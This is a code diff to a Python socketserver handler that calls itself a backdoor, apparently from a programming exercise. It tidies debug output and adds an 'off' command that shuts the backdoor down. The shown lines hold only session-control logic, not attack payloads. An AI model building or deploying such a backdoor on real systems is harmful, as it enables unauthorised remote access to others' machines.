@@ -224,10 +224,10 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 				"off"
 				])
 			message = helpMessage 
-			print(helpMessage)
-			print("Enter command:")
+			#print(helpMessage)
+			print("Help menu printed")
 			#GET USER INPUT 
-			print ("You typed " + str(userInput)) #debug
+			#print ("You typed " + str(userInput)) #debug
 		elif command == "logout":
 			message = "Logging out"
 			#terminate connection
@@ -235,11 +235,15 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 			self.CONNECTED = False
 			self.request.close()
 			return
+		elif command == "off":
+			self.request.sendall(bytearray("Terminating the backdoor\n", "utf -8"))
+			print("Backdoor has been terminated by the " + self.client_address[0])
+			self.CONNECTED = False
+			self.request.close()
+			sys.exit()
 
 		#OPTIONAL PICK 2
 
-
-		#elif userInput startswith logout (disconnect client)
 
 		#elif userInput startswith who (list users currently logged in)
 
